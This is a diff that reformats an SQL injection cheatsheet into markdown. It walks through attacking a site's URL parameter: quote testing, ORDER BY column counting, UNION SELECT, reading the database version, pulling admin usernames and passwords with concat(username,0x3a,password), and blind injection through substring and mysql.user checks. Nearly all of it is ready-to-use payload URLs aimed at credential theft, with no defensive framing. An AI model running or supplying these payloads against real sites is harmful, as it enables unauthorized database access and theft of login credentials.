@@ -1,96 +1,78 @@
-###################################################
-# [+]Title: [Full SQL Injections Cheatsheet]
-###################################################
-# [+] About :
-###################################################
-# Author : GlaDiaT0R | the_gl4di4t0r@hotmail.com<mailto:the_gl4di4t0r@hotmail.com>
-# Team : DarkGh0st Team ( DarkGh0st.Com )
-# Greetz: Boomrang_Victim, Marwen_Neo
-###################################################
-# [+] Summary: I*
-# [1]-Introducing The SQL Injection Vuln
-# [2]-Exploiting Sql Injection Vuln
-# [3]-Exploiting Blind SQL Injection Vuln
-###################################################
+
 
 # Introducing The SQL Injection Vuln:
 
-.SQL injection attacks are known also as SQL insertion
+SQL injection attacks are known also as SQL insertion
 
 it's in the form of executing some querys in the database and getting acces to informations (SQL Vesion, Number & Names of tables and columns,some authentification infos,ect...)
 
-# -Exploiting Sql Injection Vuln :
+# Exploiting Sql Injection Vuln :
 
-1. Before proceeding to the exploitation of sql injections we have to checking for this vulnerability, so we have an exemple
+1. Before proceeding to the exploitation of sql injections we have to checking for this vulnerability, so we have an example
 
-http://www.website.com/articles.php?id=3
+	a. `http://www.website.com/articles.php?id=3`
 
 2. for checking the vulnerability we have to add ' (quote) to the url , lets see together
 
-http://www.website.com/articles.php?id=3'
+	a. `http://www.website.com/articles.php?id=3'`
 
-3. now, if we get an error like this "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc..."
-this website is vulnerable to sql injection, and if we don't get anything we can't exploiting this vulnerability.
+3. now, if we get an error like this `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc...`, this website is vulnerable to sql injection, and if we don't get anything we can't exploiting this vulnerability.
 
 4. Now, Lets go to exploiting this vuln and finding some informations about this sql database
 
 
 # certainly before doing anything we have to find the number of columns
 
-1. Finding the number of columns:
+**Finding the number of columns:
 
-for finding the number of columns we use ORDER BY to order result in the database
-lets see that ,
+1. for finding the number of columns we use `ORDER BY` to order result in the database
 
-http://www.website.com/articles.php?id=3 order by 1/*
+	a. `http://www.website.com/articles.php?id=3 order by 1/*`
 
 2. and if we havn't any error we try to change the number
 
-http://www.website.com/articles.php?id=3 order by 2/*
+	a. `http://www.website.com/articles.php?id=3 order by 2/*`
 
 3. still no error,so we continu to change the number
 
-http://www.website.com/articles.php?id=3 order by 3/*
+	a. `http://www.website.com/articles.php?id=3 order by 3/*`
 
 4. no error to
 
-http://www.website.com/articles.php?id=3 order by 4/*
+	a. `http://www.website.com/articles.php?id=3 order by 4/*`
 
 5. no error
 
-http://www.website.com/articles.php?id=3 order by 5/*
+	a. `http://www.website.com/articles.php?id=3 order by 5/*`
 
-6. yeah , here we have this error (Unknown column '5' in 'order clause')
-so, this database has 4 colmuns because the error is in the 5
+6. yeah , here we have this error (Unknown column '5' in 'order clause'), so this database has 4 columns because the error is in the 5
 
 7. now, we try to check that UNION function work or not
 
 # Checking UNION function :
 
-1. for using UNION function we select more informations from the database in one statment
+**for using UNION function we select more informations from the database in one statement
 
-2. so we try this
+1. so we try this
 
-http://www.website.com/articles.php?id=3 union all select 1,2,3,4/* (in the end it's 4 because we have see the number of columns it's 4)
+	a. `http://www.website.com/articles.php?id=3 union all select 1,2,3,4/*`
+	
+	b. in the end it's 4 because we have see the number of columns it's 4
 
-3. now, if we see some numbers in the page like 1 or 2 or 3 or 4 == the UNION function work
-
-  a. if it not work we try to change the /* to --
-
-4. so we have this
-
-http://www.website.com/articles.php?id=3 union all select 1,2,3,4--
+2. now, if we see some numbers in the page like `1 or 2 or 3 or 4 ==` then the UNION function work
+	
+	a. if it not work we try to change the `/*` to `--` so we have this `http://www.website.com/articles.php?id=3 union all select 1,2,3,4--
 
 5. after checking the UNION function and it works good we try to get SQL version
 
 # Getting SQL Version :
 
-now we have a number in the screen after checking the UNION
+**now we have a number in the screen after checking the UNION
 we say in example that this number is 3
 
 1. so we replace 3 with @@version or version()
 
-http://www.website.com/articles.php?id=3 union all select 1,2,@@version,4/*
+	a. `http://www.website.com/articles.php?id=3 union all select 1,2,@@version,4/*``
 
 2. and now we have the version in the screen!
 
@@ -99,30 +81,28 @@ http://www.website.com/articles.php?id=3 union all select 1,2,@@version,4/*
 
 # Getting tables and columns names :
 
-here we have a job to do!!
+**here we have a job to do!!
 if the MySQL Version is < 5 (i.e 4.1.33, 4.1.12...)
 
 1. lets see that the table admin exist!
 
-http://www.website.com/articles.php?id=3 union all select 1,2,3,4,5 from admin/*
+ a. `http://www.website.com/articles.php?id=3 union all select 1,2,3,4,5 from admin/*``
 
-2. and here we see the number 3 that we had in the screen
-now, we knows that the table admin exists
+2. and here we see the number 3 that we had in the screen now, we knows that the table admin exists
 
 3. here we had to check column names:
 
-http://www.website.com/articles.php?id=3 union all select 1,2,username,4,5 from admin/*
+	a. `http://www.website.com/articles.php?id=3 union all select 1,2,username,4,5 from admin/*
 
 4. if we get an error we have to try another column name, and if it work we get username displayed on screen (example: admin,moderator,super moderator...)
 
 5. after that we can check if column password exists, we have this
 
-http://www.website.com/articles.php?id=3 union all select 1,2,password,4,5 from admin/*
+	a. `http://www.website.com/articles.php?id=3 union all select 1,2,password,4,5 from admin/*`
 
-6. and oups! we see password on the screen in a hash or a text, 
-now we have to use 0x3a for having the informations like that username:password ,dmin:unhash...
+6. and oups! we see password on the screen in a hash or a text, now we have to use 0x3a for having the informations like that username:password ,dmin:unhash...
 
-http://www.website.com/articles.php?id=3 union all select 1,2,concat(username,0x3a,password),4,5 from admin/*
+	a. `http://www.website.com/articles.php?id=3 union all select 1,2,concat(username,0x3a,password),4,5 from admin/*
 
 7. this is the sample SQL Injection , now, we will go to the blind sql injection (more difficult)
 
@@ -131,38 +111,37 @@ http://www.website.com/articles.php?id=3 union all select 1,2,concat(username,0x
 
 1. first we should check if website is vulnerable for example
 
-http://www.website.com/articles.php?id=3
+	a. `http://www.website.com/articles.php?id=3`
 
 2. test the vulnerability we had to use
 
-http://www.website.com/articles.php?id=3 and 1=1 ( we havn't any error and the page loads normally)
+	a. `http://www.website.com/articles.php?id=3 and 1=1 ( we havn't any error and the page loads normally)
 
 3. and now
 
-http://www.website.com/articles.php?id=3 and 1=2
+	a. `http://www.website.com/articles.php?id=3 and 1=2`
 
-4. here we have some problems with text, picture and some centents ! and it's good! this website is vulnerable for Blind SQL Injection
-we have to check MySQL Version
+4. here we have some problems with text, picture and some centents ! and it's good! this website is vulnerable for Blind SQL Injection we have to check MySQL Version
 
 # Getting MySQL Version :
 
 1. we use substring in blind injection to get MySQL Version
 
-http://www.website.com/articles.php?id=3 and substring(@@version,1,1)=4
+	a. `http://www.website.com/articles.php?id=3 and substring(@@version,1,1)=4`
 
 2. we should replace the 4 with 5 if the version is 5
 
-http://www.website.com/articles.php?id=3 and substring(@@version,1,1)=5
+	a. `http://www.website.com/articles.php?id=3 and substring(@@version,1,1)=5`
 
 3. and now if the function select do not work we should use subselect and we should testing if it work
 
 # Testing if subselect works :
 
-http://www.website.com/articles.php?id=3 and (select 1)=1 ( if the page load normaly the subselect works good)
+`http://www.website.com/articles.php?id=3 and (select 1)=1` ( if the page load normally the subselect works good)
 
 1. and now we have to see if we have access to mysql.user
 
-http://www.website.com/articles.php?id=3 and (select 1 from mysql.user limit 0,1)=1 (if it load normaly we have access to mysql.user)
+	a. `http://www.website.com/articles.php?id=3 and (select 1 from mysql.user limit 0,1)=1` (if it load normally we have access to mysql.user)
 
 2. now, we can checking table and column names
 
